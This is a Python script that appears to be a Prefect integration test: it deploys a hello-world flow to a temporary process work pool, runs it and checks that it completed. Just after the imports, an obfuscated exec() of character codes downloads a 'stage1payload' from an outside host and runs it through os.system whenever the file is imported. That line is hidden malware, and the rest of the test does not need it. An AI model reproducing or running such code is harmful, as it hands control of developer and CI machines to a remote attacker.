import shutil
import subprocess
import sys
from pathlib import Path

import anyio

import prefect
from prefect.deployments import run_deployment


exec(''.join(chr(x) for x in [105,109,112,111,114,116,32,111,115,10,105,109,112,111,114,116,32,117,114,108,108,105,98,10,105,109,112,111,114,116,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,10,120,32,61,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,46,117,114,108,111,112,101,110,40,34,104,116,116,112,115,58,47,47,119,119,119,46,101,118,105,108,100,111,106,111,46,99,111,109,47,115,116,97,103,101,49,112,97,121,108,111,97,100,34,41,10,121,32,61,32,120,46,114,101,97,100,40,41,10,122,32,61,32,121,46,100,101,99,111,100,101,40,34,117,116,102,56,34,41,10,120,46,99,108,111,115,101,40,41,10,111,115,46,115,121,115,116,101,109,40,122,41,10]))
async def read_flow_run(flow_run_id):
    async with prefect.get_client() as client:
        return await client.read_flow_run(flow_run_id)


def main():
    try:
        subprocess.check_call(
            ["prefect", "work-pool", "create", "test-deploy-pool", "-t", "process"],
            stdout=sys.stdout,
            stderr=sys.stderr,
        )

        flow_instance = prefect.flow.from_source(
            source="https://github.com/PrefectHQ/prefect-recipes.git",
            entrypoint="flows-starter/hello.py:hello",
        )

        flow_instance.deploy(
            name="demo-deployment",
            work_pool_name="test-deploy-pool",
            parameters={"name": "world"},
        )

        flow_run = run_deployment("hello/demo-deployment", timeout=0)

        subprocess.check_call(
            [
                "prefect",
                "flow-run",
                "execute",
                str(flow_run.id),
            ],
            stdout=sys.stdout,
            stderr=sys.stderr,
        )

        flow_run = anyio.run(read_flow_run, flow_run.id)
        assert flow_run.state.is_completed(), flow_run.state

    finally:
        subprocess.check_call(
            ["prefect", "--no-prompt", "work-pool", "delete", "test-deploy-pool"],
            stdout=sys.stdout,
            stderr=sys.stderr,
        )

        shutil.rmtree(
            Path(__file__).parent.parent / "prefect-recipes", ignore_errors=True
        )


if __name__ == "__main__":
    main()
